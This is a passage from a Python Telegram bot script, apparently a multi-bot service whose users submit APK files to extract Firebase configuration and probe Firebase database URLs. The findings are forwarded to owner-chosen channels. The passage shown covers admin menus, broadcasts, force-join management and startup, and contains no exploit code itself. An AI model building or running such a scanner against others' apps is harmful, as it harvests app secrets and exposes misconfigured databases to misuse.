        text = f"{box('📈 TOP SCANNERS')}\n\n" + ("\n".join(f"{meds[i]} <code>{u}</code> — <b>{len(h)}</b> scans" for i,(u,h) in enumerate(top)) or "◈ No data")
        send(text, kb=back())
        return

    # ── system info
    if d == "sys_info" and ow:
        ok()
        try:
            cpu = subprocess.check_output('cat /proc/loadavg', shell=True).decode().split()[0]
            mem_raw = subprocess.check_output('free -m', shell=True).decode().split()
            mem = f"{mem_raw[15]}/{mem_raw[7]} MB"
        except: cpu = mem = "N/A"
        send(f"{box('ℹ️ SYSTEM INFO')}\n\n{R('CPU Load',cpu,'⚙️')}\n{R('Memory',mem,'💾')}\n{R('Python',sys.version.split()[0],'🐍')}\n{R('DB','MongoDB Atlas','📂')}", kb=back())
        return

    # ── maintenance
    if d == "toggle_maint" and ow:
        ok()
        G['maint'] = not G['maint']; save_db()
        log_act(uid, f"maint {'ON' if G['maint'] else 'OFF'}")
        send(f"{box('⚙️ MAINTENANCE')}\n\n🔧 Mode: <b>{'🔴 ON — Bot paused' if G['maint'] else '🟢 OFF — Bot active'}</b>", kb=back())
        return

    # ── banned list
    if d == "ban_list" and ow:
        ok()
        text = f"{box('🚫 BANNED USERS')}\n\n" + ("\n".join(f"◈ <code>{u}</code>" for u in list(G['banned'])[:50]) or "◈ None")
        send(text, kb=back())
        return

    # ── ban/unban
    if d == "ban_u" and adm:
        ok(); set_state(uid, 'ban_user')
        send(f"{box('🚫 BAN USER')}\n\nSend the Telegram user ID to ban:", kb=mk([("❌ Cancel","cancel")]))
        return

    if d == "unban_u" and adm:
        ok(); set_state(uid, 'unban_user')
        send(f"{box('✅ UNBAN USER')}\n\nSend the Telegram user ID to unban:", kb=mk([("❌ Cancel","cancel")]))
        return

    # ── search user
    if d == "search_user" and ow:
        ok(); set_state(uid, 'search_user')
        send(f"{box('🔍 SEARCH USER')}\n\nEnter user Telegram ID:", kb=mk([("❌ Cancel","cancel")]))
        return

    # ── export
    if d == "export" and ow:
        ok()
        try:
            with open(os.path.abspath(__file__),'rb') as f:
                bot.send_document(cid, f, caption="📜 <b>Ꮇɪᴋᴇʏ Script v94.0</b>", parse_mode='HTML')
            log_act(uid, "exported script")
        except Exception as e: send(f"❌ {e}")
        return

    # ── force save
    if d == "force_save" and ow:
        force_save_now(); ok("Saving to MongoDB ✅")
        return

    # ── clear rate limits
    if d == "clear_rl" and ow:
        G['rate'].clear(); save_db(); ok("Cleared ✅")
        return

    # ── restart
    if d == "restart" and uid == PRIORITY_ADMIN:
        ok("Restarting..."); send("🔄 Restarting..."); save_db()
        os.execv(sys.executable, [sys.executable]+sys.argv)

    # ── firebase check
    if d == "fb_check":
        ok(); set_state(uid, 'fb_check')
        send(f"{box('🌐 FIREBASE CHECKER')}\n\nSend Firebase DB URL:\n<code>https://yourapp.firebaseio.com</code>", kb=mk([("❌ Cancel","cancel")]))
        return

    if d.startswith("check_fb:"):
        ok()
        url = d.split(":",1)[1]
        threading.Thread(target=firebase_check, args=(bot, cid, url, token), daemon=True).start()
        return

    # ── broadcast menu
    if d == "bc_menu" and adm:
        ok()
        all_u = set(G['users'])
        for t2 in G['bots']: all_u.update(binfo(t2).get('users',[]))
        edit(f"{box('📢 BROADCAST')}\n\n📊 Main bot users: <b>{len(G['users'])}</b>\n📊 All users total: <b>{len(all_u)}</b>\n\nChoose type:", kb=bc_kb())
        return

    if d == "bc_text" and adm:
        ok()
        targets = list(G['users']) if (is_main or ow) else binfo(token).get('users',[])
        set_state(uid, 'bc_text', targets=targets)
        send(f"{box('📝 TEXT BROADCAST')}\n\n📊 Targets: <b>{len(targets)}</b> users\n\n✍️ Send your text message now:\n<i>HTML supported</i>", kb=mk([("❌ Cancel","cancel")]))
        return

    if d == "bc_media" and adm:
        ok()
        targets = list(G['users']) if (is_main or ow) else binfo(token).get('users',[])
        set_state(uid, 'bc_media', targets=targets)
        send(f"{box('🖼️ MEDIA BROADCAST')}\n\n📊 Targets: <b>{len(targets)}</b> users\n\n📎 Send image/video/file/GIF now:", kb=mk([("❌ Cancel","cancel")]))
        return

    if d == "all_bot_bc" and ow:
        ok()
        all_u = set(G['users'])
        for t2 in G['bots']: all_u.update(binfo(t2).get('users',[]))
        all_list = list(all_u)
        edit(f"{box('📣 ALL-BOT BROADCAST')}\n\n📊 Total targets: <b>{len(all_list)}</b> users\n\nChoose broadcast type:",
            kb=mk(
                [("📝 Text","allbc_text")],
                [("🖼️ Media (img/video/file)","allbc_media")],
                [("❌ Cancel","cancel")]
            ))
        return

    if d == "allbc_text" and ow:
        ok()
        all_u = set(int(u) for u in G['users'] if u)
        for t2 in G['bots']:
            all_u.update(int(u) for u in binfo(t2).get('users',[]) if u)
        set_state(uid, 'allbc_text', targets=list(all_u))
        send(f"{box('📝 ALL-BOT TEXT BC')}\n\n📊 Targets: <b>{len(all_u)}</b> users\n\n✍️ Send your message:", kb=mk([("❌ Cancel","cancel")]))
        return

    if d == "allbc_media" and ow:
        ok()
        all_u = set(int(u) for u in G['users'] if u)
        for t2 in G['bots']:
            all_u.update(int(u) for u in binfo(t2).get('users',[]) if u)
        set_state(uid, 'allbc_media', targets=list(all_u))
        send(f"{box('🖼️ ALL-BOT MEDIA BC')}\n\n📊 Targets: <b>{len(all_u)}</b> users\n\n📎 Send image/video/file/GIF:", kb=mk([("❌ Cancel","cancel")]))
        return

    # ── schedule bc
    if d == "sched_bc" and ow:
        ok(); set_state(uid, 'sched_bc')
        send(f"{box('📅 SCHEDULE BC')}\n\nFormat:\n<code>YYYY-MM-DD HH:MM | message</code>\n\nExample:\n<code>2025-12-25 10:00 | Merry Christmas!</code>", kb=mk([("❌ Cancel","cancel")]))
        return


    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # ── FORCE JOIN MANAGEMENT ──
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    def fsub_list_kb(fsub_list, back_dest, prefix):
        """Build keyboard for fsub management"""
        m2 = types.InlineKeyboardMarkup(row_width=1)
        for i, entry in enumerate(fsub_list):
            m2.add(types.InlineKeyboardButton(
                f"❌ Remove: {entry.get('name','?')}",
                callback_data=f"{prefix}_rm:{i}"))
        m2.add(types.InlineKeyboardButton("➕ Add Channel/Group", callback_data=f"{prefix}_add"))
        m2.add(types.InlineKeyboardButton("🔙 Back", callback_data=back_dest))
        return m2

    # Main bot force join manager (owner only)
    if d == "main_fsub_mgr" and ow:
        ok()
        fl   = get_fsub_list(token, True)
        txt  = f"{box('📌 MAIN BOT FORCE JOIN')}\n\n"
        txt += "\n".join(f"◈ {e.get('name','?')} — <code>{e.get('id','')}</code>" for e in fl) or "◈ None added yet"
        txt += f"\n\n<i>Total: {len(fl)} entries</i>"
        edit(txt, fsub_list_kb(fl, "menu_main", "mfsub"))
        return

    if d == "mfsub_add" and ow:
        ok(); set_state(uid, 'mfsub_add')
        send(f"{box('➕ ADD FORCE JOIN')}\n\nFormat bhejo:\n<code>Chat ID | Name | Link</code>\n\nExample:\n<code>-1001234567890 | My Channel | https://t.me/mychannel</code>",
             kb=mk([("❌ Cancel","main_fsub_mgr")]))
        return

    if d.startswith("mfsub_rm:") and ow:
        ok()
        idx2 = int(d.split(":")[1])
        fl   = G.setdefault('main_fsub', [
            {'id': FSUB_CHANNEL_ID, 'link': FSUB_CHANNEL_LINK, 'name': 'Channel'},
            {'id': FSUB_GROUP_ID,   'link': FSUB_GROUP_LINK,   'name': 'Group'},
        ])
        if 0 <= idx2 < len(fl):
            removed = fl.pop(idx2)
            G['main_fsub'] = fl
            save_db()
            send(f"✅ Removed: <b>{removed.get('name','?')}</b>", kb=mk([("🔙 Back","main_fsub_mgr")]))
        return

    # Sub-bot force join manager (sub-bot admin)
    if d == "sub_fsub_mgr" and adm:
        ok()
        fl   = get_fsub_list(token, is_main_bot)
        txt  = f"{box('📌 BOT FORCE JOIN')}\n\n"
        txt += "\n".join(f"◈ {e.get('name','?')} — <code>{e.get('id','')}</code>" for e in fl) or "◈ None added yet"
        txt += f"\n\n<i>Total: {len(fl)} entries</i>"
        edit(txt, fsub_list_kb(fl, "menu_main", "sfsub"))
        return

    if d == "sfsub_add" and adm:
        ok(); set_state(uid, 'sfsub_add')
        send(f"{box('➕ ADD FORCE JOIN')}\n\nFormat bhejo:\n<code>Chat ID | Name | Link</code>\n\nExample:\n<code>-1001234567890 | My Group | https://t.me/mygroup</code>",
             kb=mk([("❌ Cancel","sub_fsub_mgr")]))
        return

    if d.startswith("sfsub_rm:") and adm:
        ok()
        idx2 = int(d.split(":")[1])
        bi2  = binfo(token)
        fl   = bi2.get('fsub', [])
        if 0 <= idx2 < len(fl):
            removed = fl.pop(idx2)
            bi2['fsub'] = fl
            save_db()
            send(f"✅ Removed: <b>{removed.get('name','?')}</b>", kb=mk([("🔙 Back","sub_fsub_mgr")]))
        return

    # bot_fsub from bot manage panel (owner only)
    if d.startswith("bot_fsub:") and ow:
        ok()
        tk   = d.split(":",1)[1]
        ftk  = find_tok(tk)
        if not ftk: send("❌ Bot not found"); return
        fl   = binfo(ftk).get('fsub', [])
        txt  = f"{box('📌 FORCE JOIN — ' + binfo(ftk).get('name','Bot')[:12])}\n\n"
        txt += "\n".join(f"◈ {e.get('name','?')} — <code>{e.get('id','')}</code>" for e in fl) or "◈ None added yet"
        m2   = types.InlineKeyboardMarkup(row_width=1)
        for i, entry in enumerate(fl):
            m2.add(types.InlineKeyboardButton(f"❌ Remove: {entry.get('name','?')}", callback_data=f"bfsub_rm:{tk}:{i}"))
        m2.add(types.InlineKeyboardButton("➕ Add", callback_data=f"bfsub_add:{tk}"))
        m2.add(types.InlineKeyboardButton("🔙 Back", callback_data=f"bot_open:{tk}"))
        edit(txt, m2)
        return

    if d.startswith("bfsub_add:") and ow:
        ok()
        tk = d.split(":",1)[1]
        set_state(uid, 'bfsub_add', tk=tk)
        send(f"{box('➕ ADD FORCE JOIN')}\n\nFormat:\n<code>Chat ID | Name | Link</code>",
             kb=mk([("❌ Cancel","bot_list")]))
        return

    if d.startswith("bfsub_rm:") and ow:
        ok()
        parts = d.split(":")
        tk    = parts[1]
        idx2  = int(parts[2])
        ftk   = find_tok(tk)
        if ftk:
            fl = binfo(ftk).get('fsub', [])
            if 0 <= idx2 < len(fl):
                removed = fl.pop(idx2)
                binfo(ftk)['fsub'] = fl
                save_db()
                send(f"✅ Removed: <b>{removed.get('name','?')}</b>", kb=mk([("🔙 Back",f"bot_fsub:{tk}")]))
        return

    # ── bot list
    if d == "bot_list" and ow:
        ok()
        cnt = len(G['bots'])
        edit(f"{box(f'🤖 BOT LIST ({cnt})')}\n\nClick any bot to manage:", kb=bot_list_kb())
        return

    # ── add bot
    if d == "bot_add" and ow:
        ok(); set_state(uid, 'add_bot')
        send(f"{box('🤖 ADD NEW BOT')}\n\nEnter bot token from @BotFather:\n<code>123456789:ABC-DEF...</code>", kb=mk([("❌ Cancel","cancel"),("🔙 Back","bot_list")]))
        return

    # ── open/manage bot
    if d.startswith("bot_open:") and ow:
        ok()
        tk  = d.split(":",1)[1]
        ftk = find_tok(tk)
        if not ftk: send("❌ Bot not found"); return
        bi  = binfo(ftk)
        adm_list = bi.get('admins',[])
        panel = (
            f"{box('🤖 BOT CONTROL PANEL')}\n\n"
            f"📛 <b>Name:</b> {bi.get('name','Bot')}\n"
            f"🔑 <b>Token:</b> <code>{ftk[:22]}...</code>\n"
            f"{L1}\n"
            f"{R('Users',len(bi.get('users',[])))}\n"
            f"{R('Scans',bi.get('scans',0))}\n"
            f"{R('Admins',len(adm_list),'👮')}\n"
            + ("\n".join(f"  ◈ <code>{a}</code>" for a in adm_list[:5]) or "  ◈ None")
            + f"\n{L1}\n"
            f"✉️ Welcome: {'✅ Custom' if get_msg(ftk,'welcome') else '📄 Default'} | "
            f"📋 Result: {'✅ Custom' if get_msg(ftk,'result_hdr') else '📄 Default'}\n"
            f"📝 Dev Name: <b>{get_msg(ftk,'dev_name','Ꮇɪᴋᴇʏ') or 'Ꮇɪᴋᴇʏ'}</b> | "
            f"🔗 Dev User: @<b>{get_msg(ftk,'dev_user','Godxpainx') or 'Godxpainx'}</b>\n"
            f"{L1}\n👇 Select action:"
        )
        send(panel, kb=bot_manage_kb(tk))
        return

    # also handle bot_manage: for backward compat
    if d.startswith("bot_manage:") and ow:
        call.data = "bot_open:" + d.split(":",1)[1]
        _cb(bot, call, token, is_main); return

    # ── bot rename
    if d.startswith("bot_rename:") and ow:
        ok(); tk = d.split(":",1)[1]
        set_state(uid, 'bot_rename', tk=tk)
        send(f"{box('✏️ RENAME BOT')}\n\nEnter new name:", kb=mk([("❌ Cancel","cancel"),("🔙 Back","bot_open:"+tk)]))
        return

    # ── bot delete
    if d.startswith("bot_delete:") and ow:
        ok(); tk = d.split(":",1)[1]
        ftk = find_tok(tk)
        if ftk:
            del G['bots'][ftk]; G['messages'].pop(ftk,None); save_db()
            log_act(uid, f"deleted bot {ftk[:15]}")
            send(f"🗑️ <b>Bot deleted.</b>", kb=back("bot_list"))
        return

    # ── bot admins view
    if d.startswith("bot_admins:") and ow:
        ok(); tk = d.split(":",1)[1]; ftk = find_tok(tk)
        adm_list = binfo(ftk).get('admins',[]) if ftk else []
        send(f"{box('👤 BOT ADMINS')}\n\n" + ("\n".join(f"◈ <code>{a}</code>" for a in adm_list) or "◈ None"), kb=back("bot_open:"+tk))
        return

    # ── bot add admin
    if d.startswith("bot_addadmin:") and ow:
        ok(); tk = d.split(":",1)[1]
        ftk = find_tok(tk)
        cur = binfo(ftk).get('admins',[]) if ftk else []
        set_state(uid, 'bot_addadmin', tk=tk)
        send(
            f"{box('➕ ADD ADMIN')}\n\n"
            f"Current admins ({len(cur)}):\n"
            + ("\n".join(f"◈ <code>{a}</code>" for a in cur[:5]) or "◈ None")
            + "\n\nEnter new admin user ID:",
            kb=mk([("❌ Cancel","cancel"),("🔙 Back","bot_open:"+tk)]))
        return

    # ── bot del admin
    if d.startswith("bot_deladmin:") and ow:
        ok(); tk = d.split(":",1)[1]
        ftk = find_tok(tk)
        cur = binfo(ftk).get('admins',[]) if ftk else []
        set_state(uid, 'bot_deladmin', tk=tk)
        send(
            f"{box('➖ REMOVE ADMIN')}\n\n"
            f"Current admins:\n"
            + ("\n".join(f"◈ <code>{a}</code>" for a in cur) or "◈ None")
            + "\n\nEnter admin ID to remove:",
            kb=mk([("❌ Cancel","cancel"),("🔙 Back","bot_open:"+tk)]))
        return

    # ── bot stats
    if d.startswith("bot_stats:") and ow:
        ok(); tk = d.split(":",1)[1]; ftk = find_tok(tk)
        bi = binfo(ftk) if ftk else {}
        send(f"{box('📊 BOT STATS')}\n\n{R('Name',bi.get('name','Bot'))}\n{R('Scans',bi.get('scans',0))}\n{R('Users',len(bi.get('users',[])))}\n{R('Admins',len(bi.get('admins',[])))}", kb=back("bot_open:"+tk))
        return

    # ── bot users
    if d.startswith("bot_users:") and ow:
        ok(); tk = d.split(":",1)[1]; ftk = find_tok(tk)
        us = binfo(ftk).get('users',[]) if ftk else []
        text = f"{box(f'BOT USERS ({len(us)})')}\n\n" + ("\n".join(f"◈ <code>{u}</code>" for u in us[:50]) or "◈ None")
        if len(us)>50: text += f"\n...+{len(us)-50}"
        send(text, kb=back("bot_open:"+tk))
        return

    # ── bot broadcast
    if d.startswith("bot_bc:") and ow:
        ok(); tk = d.split(":",1)[1]; ftk = find_tok(tk)
        bi = binfo(ftk) if ftk else {}
        targets = bi.get('users',[])
        set_state(uid, 'bot_bc_text', tk=tk)
        send(
            f"{box('📢 BOT BROADCAST')}\n\n"
            f"Bot: <b>{bi.get('name','Bot')}</b>\n"
            f"📊 Targets: <b>{len(targets)}</b> users\n\n"
            f"Send text or media to broadcast:",
            kb=mk([("📝 Text","bot_bc_text:"+tk),("🖼️ Media","bot_bc_media:"+tk),("❌ Cancel","cancel")]))
        return

    if d.startswith("bot_bc_text:") and ow:
        ok(); tk = d.split(":",1)[1]
        set_state(uid, 'bot_bc_text', tk=tk)
        send(f"{box('📝 BOT TEXT BC')}\n\nSend text to broadcast to this bot's users:", kb=mk([("❌ Cancel","cancel")]))
        return

    if d.startswith("bot_bc_media:") and ow:
        ok(); tk = d.split(":",1)[1]
        set_state(uid, 'bot_bc_media', tk=tk)
        send(f"{box('🖼️ BOT MEDIA BC')}\n\nSend image/video/file to broadcast:", kb=mk([("❌ Cancel","cancel")]))
        return

    # ── set welcome
    if d.startswith("bot_welcome:") and ow:
        ok(); tk = d.split(":",1)[1]; ftk = find_tok(tk)
        cur = get_msg(ftk,'welcome','(default)') if ftk else '(default)'
        set_state(uid, 'set_welcome', tk=tk)
        send(f"{box('✉️ WELCOME MESSAGE')}\n\nCurrent:\n<i>{str(cur)[:150]}</i>\n\nSend new welcome message:", kb=mk([("❌ Cancel","cancel"),("🔙 Back","bot_open:"+tk)]))
        return

    # ── set result header
    if d.startswith("bot_result:") and ow:
        ok(); tk = d.split(":",1)[1]; ftk = find_tok(tk)
        cur = get_msg(ftk,'result_hdr','(default)') if ftk else '(default)'
        set_state(uid, 'set_result', tk=tk)
        send(f"{box('📋 RESULT HEADER')}\n\nCurrent:\n<i>{str(cur)[:150]}</i>\n\nSend new result header:", kb=mk([("❌ Cancel","cancel"),("🔙 Back","bot_open:"+tk)]))
        return

    # ── edit branding (from scan result button)
    if d.startswith("edit_brand:") and adm:
        ok()
        tk = d.split(":",1)[1]
        ftk = find_tok(tk) or token
        send(
            f"{box('✏️ EDIT BOT BRANDING')}\n\n"
            f"What do you want to edit?",
            kb=mk(
                [("✉️ Welcome Message","bot_welcome:"+tk)],
                [("📋 Result Header","bot_result:"+tk)],
                [("🔙 Back","cancel")]
            ))
        return

    # ── edit dev name
    if d.startswith("bot_devname:") and ow:
        ok(); tk = d.split(":",1)[1]
        ftk = find_tok(tk)
        cur = G['messages'].get(ftk,{}).get('dev_name','Godxpainx') if ftk else 'Godxpainx'
        set_state(uid, 'bot_devname', tk=tk)
        send(
            f"{box('📝 EDIT DEV NAME')}\n\n"
            f"Current: <b>{cur}</b>\n\n"
            f"Send new developer name:\n"
            f"<i>This replaces 'Ꮇɪᴋᴇʏ' everywhere in this bot</i>",
            kb=mk([("❌ Cancel","cancel"),("🔙 Back","bot_open:"+tk)]))
        return

    # ── edit dev username
    if d.startswith("bot_devuser:") and ow:
        ok(); tk = d.split(":",1)[1]
        ftk = find_tok(tk)
        cur = G['messages'].get(ftk,{}).get('dev_user','Godxpainx') if ftk else 'Godxpainx'
        set_state(uid, 'bot_devuser', tk=tk)
        send(
            f"{box('🔗 EDIT DEV USERNAME')}\n\n"
            f"Current: @<b>{cur}</b>\n\n"
            f"Send new username (without @):\n"
            f"<i>This replaces '@Godxpainx' everywhere in this bot</i>",
            kb=mk([("❌ Cancel","cancel"),("🔙 Back","bot_open:"+tk)]))
        return

    # ── reset welcome
    if d.startswith("bot_delwelcome:") and ow:
        ok(); tk = d.split(":",1)[1]; ftk = find_tok(tk)
        if ftk: G['messages'].get(ftk,{}).pop('welcome',None); save_db()
        send("✅ Welcome message reset to default.", kb=back("bot_open:"+tk))
        return

    # ── reset result header
    if d.startswith("bot_delresult:") and ow:
        ok(); tk = d.split(":",1)[1]; ftk = find_tok(tk)
        if ftk: G['messages'].get(ftk,{}).pop('result_hdr',None); save_db()
        send("✅ Result header reset to default.", kb=back("bot_open:"+tk))
        return

    # ── view msgs
    if d.startswith("bot_viewmsgs:") and ow:
        ok(); tk = d.split(":",1)[1]; ftk = find_tok(tk)
        msgs = G['messages'].get(ftk,{}) if ftk else {}
        send(
            f"{box('👁️ CUSTOM MESSAGES')}\n\n"
            f"<b>Dev Name:</b> {msgs.get('dev_name','Ꮇɪᴋᴇʏ')}\n"
            f"<b>Dev User:</b> @{msgs.get('dev_user','Godxpainx')}\n\n"
            f"<b>Welcome:</b>\n{msgs.get('welcome','(default)')[:200]}\n\n"
            f"<b>Result Header:</b>\n{msgs.get('result_hdr','(default)')[:200]}",
            kb=back("bot_open:"+tk))
        return

    # ── set help content
    if d == "set_help" and adm:
        ok()
        set_state(uid, 'set_help', token=token)
        send(
            f"{box('❓ SET HELP CONTENT')}\n\n"
            f"Send anything to use as Help guide:\n\n"
            f"◈ 📝 Text message\n"
            f"◈ 🖼️ Photo (with caption)\n"
            f"◈ 🎥 Video (with caption)\n"
            f"◈ 📄 Document/File\n"
            f"◈ 🎵 Audio\n"
            f"◈ 🎭 GIF/Animation\n\n"
            f"<i>Users will see this when they tap ❓ Help button</i>",
            kb=mk([("❌ Cancel","cancel")]))
        return

    # ── preview help
    if d == "preview_help" and adm:
        ok()
        hc = G.get('help_content',{}).get(token) or G.get('help_content',{}).get('main')
        if not hc:
            send("❌ No help content set yet. Use '❓ Set Help Content' first.")
            return
        _send_help(bot, cid, hc)
        return

    # ── user help button
    if d == "user_help":
        ok()
        hc = G.get('help_content',{}).get(token) or G.get('help_content',{}).get('main')
        if not hc:
            send(f"{box('❓ HELP / GUIDE')}\n\n"
                 f"◈ Send any <b>.apk</b> file to extract Firebase config\n"
                 f"◈ /firebase [URL] to check a database\n\n"
                 f"<b>Limit:</b> 5 scans per minute\n"
                 f"👑 @{get_msg(token,'dev_user','Godxpainx')}",
                 kb=back())
            return
        _send_help(bot, cid, hc)
        return

    # ── channel list
    if d == "ch_list" and ow:
        ok()
        chs = list(G.get('fwd_channels', set()))
        text = (f"{box('📡 FORWARD CHANNELS')}\n\n"
                f"Scan results will be forwarded here.\n{L1}\n"
                + ("\n".join(f"◈ <code>{c}</code>" for c in chs) or "◈ None added yet"))
        send(text, kb=mk(
            [("➕ Add Channel/Group","ch_add")],
            [("➖ Remove Channel","ch_remove")],
            [("🔙 Back","menu_main")]
        ))
        return

    # ── add channel
    if d == "ch_add" and ow:
        ok()
        set_state(uid, 'ch_add')
        send(
            f"{box('➕ ADD CHANNEL/GROUP')}\n\n"
            f"Steps:\n"
            f"1. Add bot as <b>Admin</b> in your channel/group\n"
            f"2. Send the Chat ID here\n\n"
            f"<b>How to get Chat ID:</b>\n"
            f"Forward any message from channel to @userinfobot\n\n"
            f"Enter Chat ID (e.g. <code>-1001234567890</code>):",
            kb=mk([("❌ Cancel","cancel")])
        )
        return

    # ── remove channel
    if d == "ch_remove" and ow:
        ok()
        set_state(uid, 'ch_remove')
        chs = list(G.get('fwd_channels', set()))
        send(
            f"{box('➖ REMOVE CHANNEL')}\n\n"
            f"Current channels:\n"
            + ("\n".join(f"◈ <code>{c}</code>" for c in chs) or "◈ None")
            + "\n\nEnter Chat ID to remove:",
            kb=mk([("❌ Cancel","cancel")])
        )
        return


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  📅  SCHEDULED BROADCAST
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def sched_worker(bot):
    while True:
        try:
            now = datetime.now().strftime('%Y-%m-%d %H:%M')
            for sb in list(G['scheduled']):
                if sb.get('time') == now:
                    threading.Thread(target=do_bc_text, args=(bot, sb['text'], PRIORITY_ADMIN, list(G['users'])), daemon=True).start()
                    G['scheduled'].remove(sb); save_db()
        except: pass
        time.sleep(30)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🚀  LAUNCH
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
if __name__ == '__main__':
    pass  # mongo removed
    load_db()
    threading.Thread(target=_auto_save_loop, daemon=True).start()
    print("[AUTO-SAVE] Started — saves every 10s when dirty ✅")
    print(f"""
╔══════════════════════════════════════════╗
║   🔥 Ꮇɪᴋᴇʏ SUPREME GOD-MODE v98.0 🔥    ║
║   State-Based | Anti-Crash | Termux OK   ║
║   Developer: @Godxpainx (Main Owner)  ║
╚══════════════════════════════════════════╝
  📊 Users: {len(G['users'])} | Bots: {len(G['bots'])} | Scans: {G['scans']}
  ✅ DB: MongoDB Atlas
{'─'*44}""")

    threading.Thread(target=run_bot, args=(BOT_TOKEN, PRIORITY_ADMIN, True), daemon=True).start()
    # Sub-bots — main token se alag hone chahiye
    for t, info in list(G['bots'].items()):
        if t.strip() == BOT_TOKEN.strip():
            print(f"[SKIP] Sub-bot token same as main — skipping to avoid 409")
            continue
        owner = info.get('owner', PRIORITY_ADMIN) if isinstance(info, dict) else PRIORITY_ADMIN
        threading.Thread(target=run_bot, args=(t, owner, False), daemon=True).start()
        time.sleep(1)  # Stagger start — avoid simultaneous polling

    def auto_save():
        while True: time.sleep(60); save_db()
    threading.Thread(target=auto_save, daemon=True).start()

    # ── Keep-alive HTTP server — auto detect platform ──
    # Render pe PORT env set hoti hai → HTTP server start karo
    # RDP/VPS/Termux pe PORT nahi hoti → skip karo, bot chalta rahe
    import os as _os2
    _port = _os2.environ.get('PORT', None)
    if _port:
        from http.server import HTTPServer, BaseHTTPRequestHandler as _BH
        class _KA(_BH):
            def do_GET(self):
                self.send_response(200); self.end_headers()
                self.wfile.write(b'MIKEY Bot Online')
            def do_HEAD(self):
                self.send_response(200); self.end_headers()
            def log_message(self, *a): pass
        _srv = HTTPServer(('0.0.0.0', int(_port)), _KA)
        print(f"[HTTP] Render mode — keep-alive on port {_port}")
        try:
            _srv.serve_forever()
        except KeyboardInterrupt:
            print("\n[EXIT] Saving..."); save_db(); print("Bye!")
    else:
        # RDP / VPS / Termux — just keep main thread alive
        print("[RUN] RDP/VPS/Termux mode — bot running...")
        try:
            while True: time.sleep(60)
        except KeyboardInterrupt:
            print("\n[EXIT] Saving..."); save_db(); print("Bye!")
